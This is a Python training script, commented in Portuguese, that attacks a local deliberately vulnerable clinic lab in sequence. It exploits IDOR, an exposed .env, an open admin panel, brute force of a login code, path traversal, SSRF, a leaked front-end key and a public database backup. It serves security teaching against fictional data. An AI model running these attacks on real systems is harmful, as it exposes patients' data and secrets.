# -*- coding: utf-8 -*-
"""
🎯 SIMULAÇÃO DE ATAQUES — Clínica VidaPlena (LAB DE TREINAMENTO)
Roda as 8 falhas plantadas em sequência, contra o lab local.
Uso:  python MISSOES/simular-ataques.py
"""
import json
import sys
import time
import urllib.request
import urllib.error

B = "http://localhost:3400"
OK = 0
FALHOU = 0

def mark(ok):
    global OK, FALHOU
    if ok:
        OK += 1
        return "✓ VULNERÁVEL"
    FALHOU += 1
    return "✗ protegido?"

def req(path, method="GET", data=None):
    r = urllib.request.Request(
        B + path, method=method,
        data=json.dumps(data).encode() if data else None,
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception:
        return 0, ""

def titulo(n, nome, desc):
    print()
    print("─" * 66)
    print(f"  🎯 FALHA {n:02d} · {nome}")
    print(f"     {desc}")
    print("─" * 66)

print()
print("=" * 66)
print("  🏥 SIMULAÇÃO DE ATAQUES · Clínica VidaPlena (lab de treino)")
print(f"  alvo: {B} · dados 100% fictícios · autorizado (é o NOSSO lab)")
print("=" * 66)

s, _ = req("/")
if s != 200:
    print()
    print("  ⚠️  O lab não está no ar. Rode primeiro:")
    print("      cd clinica-vidaplena && node server.js")
    sys.exit(2)

time.sleep(0.4)

# ── 01 · IDOR ────────────────────────────────────────────────
titulo(1, "IDOR", "a Mariana lê o agendamento (com observação médica) do Bruno")
print("  Pedindo o agendamento 103 com o token da Mariana...")
s, b = req("/api/agendamentos/103?token=tok_mariana_4d1")
d = json.loads(b) if s == 200 else {}
print(f"  → [{mark(s == 200 and d.get('paciente_id') == 2)}] dono do agendamento: paciente #{d.get('paciente_id')}")
print(f"  → observação vazada: \"{str(d.get('observacoes'))[:64]}...\"")
time.sleep(0.5)

# ── 02 · .env ────────────────────────────────────────────────
titulo(2, ".env EXPOSTO", "as chaves da clínica servidas pela web")
s, b = req("/.env")
linhas = [l for l in b.splitlines() if "=" in l and not l.startswith("#")]
print(f"  → [{mark(s == 200 and len(linhas) > 3)}] {len(linhas)} segredos baixados direto do site")
for l in linhas[:3]:
    print(f"     {l.split('=')[0]}=...(fictício)")
time.sleep(0.5)

# ── 03 · painel interno aberto ───────────────────────────────
titulo(3, "PAINEL INTERNO ABERTO", "paciente logada vê todos os CPFs e o faturamento")
s, b = req("/api/admin/pacientes?token=tok_mariana_4d1")
tem_cpf = "412.365.897-00" in b
s2, b2 = req("/api/admin/financeiro?token=tok_mariana_4d1")
tem_fin = "187.430" in b2
print(f"  → [{mark(tem_cpf)}] lista de pacientes com CPF e telefone exposta")
print(f"  → financeiro do mês: {json.loads(b2).get('faturamento_bruto', '?')} visível pra uma PACIENTE")
time.sleep(0.5)

# ── 04 · brute force do código ───────────────────────────────
titulo(4, "CÓDIGO SEM LIMITE", "brute force do código de 4 dígitos (sem rate limit)")
achou = None
for i in range(4790, 4901):
    code = f"{i:04d}"
    s, b = req("/api/login/codigo", "POST", {"email": "mariana@exemplo.com", "codigo": code})
    if s == 200 and '"token"' in b:
        achou = code
        break
print(f"  → tentativas erradas seguidas, sem bloqueio, sem espera...")
print(f"  → [{mark(achou == '4815')}] código descoberto: {achou} → token {json.loads(b).get('token') if achou else '?'}")
time.sleep(0.5)

# ── 05 · path traversal ──────────────────────────────────────
titulo(5, "PATH TRAVERSAL", "o 'download de exame' entrega o arquivo de segredos")
s, b = req("/api/exame?arquivo=../../.env")
print(f"  → pedi um exame, veio: {'arquivo de SEGREDOS' if 'OPENAI' in b else '?'}")
print(f"  → [{mark(s == 200 and 'OPENAI' in b)}] prova: primeiras linhas do .env via /api/exame")
time.sleep(0.5)

# ── 06 · SSRF ────────────────────────────────────────────────
titulo(6, "SSRF", "a 'foto de perfil' faz o SERVIDOR buscar a URL que eu quiser")
s, b = req("/api/importar-foto", "POST", {"url": "http://localhost:3400/.env"})
tem = "OPENAI" in b
print(f"  → colei a URL interna do .env no campo de foto de perfil")
print(f"  → [{mark(tem)}] o servidor foi lá, buscou e me devolveu o conteúdo")
time.sleep(0.5)

# ── 07 · chave no front ──────────────────────────────────────
titulo(7, "CHAVE NO FRONT", "a chave da assistente virtual no JavaScript público")
s, b = req("/app.js")
tem = "VIDA_AI_KEY" in b
print(f"  → qualquer visitante lê no F12 (Sources → app.js)")
print(f"  → [{mark(tem)}] chave embutida no código do navegador")
time.sleep(0.5)

# ── 08 · backup + headers ────────────────────────────────────
titulo(8, "BACKUP EXPOSTO + HEADERS", "o dump do banco servido na pasta pública")
s, b = req("/backup.sql")
s2, _ = req("/")
print(f"  → /backup.sql: HTTP {s} {'(com CREATE TABLE e dados)' if 'CREATE TABLE' in b else ''}")
print(f"  → [{mark(s == 200 and 'CREATE TABLE' in b)}] backup do banco aberto + servidor anunciando tecnologia")
time.sleep(0.4)

# ── resumo ───────────────────────────────────────────────────
print()
print("=" * 66)
print(f"  RESULTADO: {OK}/8 falhas exploradas com sucesso 🧀")
print("  A clínica parece perfeita por fora. Por dentro, é um queijo suíço.")
print("  Próximo passo: a BLINDAGEM (parte 2) e rodar essa simulação de novo.")
print("=" * 66)
print()
